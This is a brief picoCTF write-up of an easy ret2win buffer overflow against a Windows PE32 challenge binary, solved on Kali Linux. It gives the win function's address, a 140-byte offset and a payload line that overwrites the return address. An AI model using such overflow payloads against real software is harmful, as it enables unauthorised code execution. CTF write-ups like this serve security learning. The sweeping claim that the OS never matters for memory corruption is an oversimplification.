# PicoCTF — Windows Ret2win (No Wine, No VM)

**Platform:** picoCTF  
**Technique:** Buffer Overflow / Ret2win  
**Difficulty:** Easy  
**Binary Format:** Windows PE32 (.exe)  
**Environment:** Kali Linux (no Wine, no VM)

---

## The Challenge

A Windows executable. On a Linux machine. No Wine. No VirtualBox. Just a terminal and a target.

The goal: redirect execution to a `win` function and get the flag.

---

## Why This Matters

Most people assume:
- Windows binaries need Windows
- Wine or a VM is required
- Cross-platform pwn is hard

**None of that is true.**

A binary is just bytes. Memory corruption works the same everywhere. The OS doesn't matter. The file extension doesn't matter.

---

## The Exploit

### Step 1: Analyze the binary

```bash
gdb vuln.exe
(gdb) disas win
Output:

text
Dump of assembler code for function win:
   0x00401530 <+0>:     push   ebp
   0x00401531 <+1>:     mov    ebp,esp
   ...
Win address: 0x00401530

Step 2: Find the offset
Cause a crash, inspect the crash address.

Offset: 140 bytes to return address.

Step 3: Craft the payload
text
payload = b'A'*140 + b'\x30\x15\x40\x00'
